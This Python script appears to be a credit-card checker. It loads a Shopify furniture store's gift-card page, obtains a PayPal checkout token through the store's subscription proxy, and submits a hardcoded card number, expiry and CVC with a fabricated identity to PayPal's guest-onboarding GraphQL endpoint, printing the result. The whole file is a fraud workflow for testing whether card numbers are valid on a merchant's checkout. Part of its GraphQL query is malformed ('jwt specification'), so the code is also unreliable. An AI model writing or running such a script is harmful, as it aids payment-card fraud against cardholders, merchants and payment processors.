import sys, os, re, requests, json
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

test_card = "5187255864020882"
mm = "05"
yy = "2030"
cvc = "540"

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
})

# 1. Product page
r = s.get('https://lounsbury-furniture-moncton.myshopify.com/products/gift-card?variant=44840505180479', timeout=15)

# 2. Init PayPal Subscription / Token
payload_sub = {
    "product": {
        "id": "44840505180479",
        "quantity": 1,
        "properties": {}
    }
}
headers_sub = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Origin': 'https://lounsbury-furniture-moncton.myshopify.com',
    'Referer': 'https://lounsbury-furniture-moncton.myshopify.com/products/gift-card?variant=44840505180479',
}
r_sub = s.post('https://lounsbury-furniture-moncton.myshopify.com/apps/recharge-proxy/shop/subscriptions', json=payload_sub, headers=headers_sub, timeout=15)
print("r_sub text:", r_sub.text)
match_id = re.search(r'"id":"([^"]+)"', r_sub.text)
id_token_cart = match_id.group(1) if match_id else None
print("id_token_cart:", id_token_cart)

# 3. Get Cart Token from PayPal
headers_pp = {
    'Accept': 'application/json',
    'X-Requested-By': 'smart-payment-buttons',
    'Origin': 'https://www.paypal.com',
}
r_cart = s.post(f'https://www.paypal.com/smart/api/billagmt/subscriptions/{id_token_cart}/cartid', headers=headers_pp, timeout=15)
print("r_cart text:", r_cart.text)
try:
    cart_json = r_cart.json()
    token_checkout = cart_json.get('token')
except Exception:
    token_checkout = None

if not token_checkout:
    match_tok = re.search(r'"token":"([^"]+)"', r_cart.text)
    token_checkout = match_tok.group(1) if match_tok else id_token_cart

print("token_checkout:", token_checkout)

headers_gql = {
    'Content-Type': 'application/json',
    'Paypal-Client-Context': token_checkout,
    'X-App-Name': 'checkoutuinodeweb_weasley',
    'Origin': 'https://www.paypal.com',
    'X-Country': 'US',
}

graphql_payload = {
    'operationName': 'OnboardGuestMutation',
    'variables': {
        'card': {
            'cardNumber': test_card,
            'expirationDate': f"{mm}/{yy}",
            'securityCode': cvc,
            'type': 'MASTER_CARD',
        },
        'country': 'US',
        'email': 'james.smith991@gmail.com',
        'firstName': 'James',
        'lastName': 'Smith',
        'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'},
        'supportedThreeDsExperiences': ['IFRAME'],
        'token': token_checkout,
        'billingAddress': {
            'line1': '8872 SE Vandalia Dr',
            'city': 'Runnells',
            'state': 'IA',
            'postalCode': '50237',
            'country': 'US',
            'familyName': 'Smith',
            'givenName': 'James',
        },
        'shippingAddress': {
            'line1': '',
            'city': '',
            'state': '',
            'postalCode': '',
            'accountQuality': {
                'autoCompleteType': 'MANUAL',
                'isUserModified': False,
            },
            'country': 'US',
            'familyName': 'James',
            'givenName': 'Smith',
        },
        'crsData': None,
    },
    'query': 'mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String!) {\n  onboardAccount: onboardGuest(\n    bank: $bank\n    billingAddress: $billingAddress\n    card: $card\n    country: $country\n    currencyConversionType: $currencyConversionType\n    dateOfBirth: $dateOfBirth\n    email: $email\n    firstName: $firstName\n    lastName: $lastName\n    phone: $phone\n    shareAddressWithDonatee: $shareAddressWithDonatee\n    shippingAddress: $shippingAddress\n    token: $token\n  ) {\n    buyer {\n      auth {\n        accessToken\n        __typename\n      }\n      userId\n      __typename\n    }\n    flags {\n      is3DSecureRequired\n      __typename\n    }\n    ...fundingOptions\n    paymentContingencies {\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\n        status\n        redirectUrl {\n          href\n          __typename\n        }\n        method\n        parameter\n        experience\n        requestParams {\n          key\n          value\n          __typename\n        }\n        __typename\n      }\n      ...threeDSContingencyData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment fundingOptions on CheckoutSession {\n  fundingOptions {\n    allPlans {\n      fundingSources {\n        fundingInstrument {\n          id\n          __typename\n        }\n        amount {\n          currencyCode\n          currencyValue\n          __typename\n        }\n        __typename\n      }\n      fundingContingencies {\n        ... on OpenBankingContingency {\n          encryptedId\n          contingencyReasons\n          contingencyType\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    fundingInstrument {\n      id\n      lastDigits\n      name\n      nameDescription\n      type\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment threeDSContingencyData on PaymentContingencies {\n  threeDSContingencyData {\n    name\n    causeName\n    resolution {\n      type\n      resolutionName\n      paymentCard {\n        billingAddress {\n          line1\n          line2\n          city\n          state\n          country\n          postalCode\n          __typename\n        }\n        expireYear\n        expireMonth\n        currencyCode\n        cardProductClass\n        id\n        encryptedNumber\n        type\n        number\n        bankIdentificationNumber\n        __typename\n      }\n      contingencyContext {\n        deviceDataCollectionUrl {\n          href\n          __typename\n        }\n        jwt specification {\n          jwtDuration\n          jwtIssuer\n          jwtOrgUnitId\n          type\n          __typename\n        }\n        authenticationProvider\n        cardBrandProcessed\n        reason\n        referenceId\n        source\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n'
}

if token_checkout:
    r_gql = s.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers=headers_gql, json=graphql_payload, timeout=20)
    print("GraphQL Status:", r_gql.status_code)
    print("Full GraphQL JSON Response:")
    print(json.dumps(r_gql.json(), indent=2))
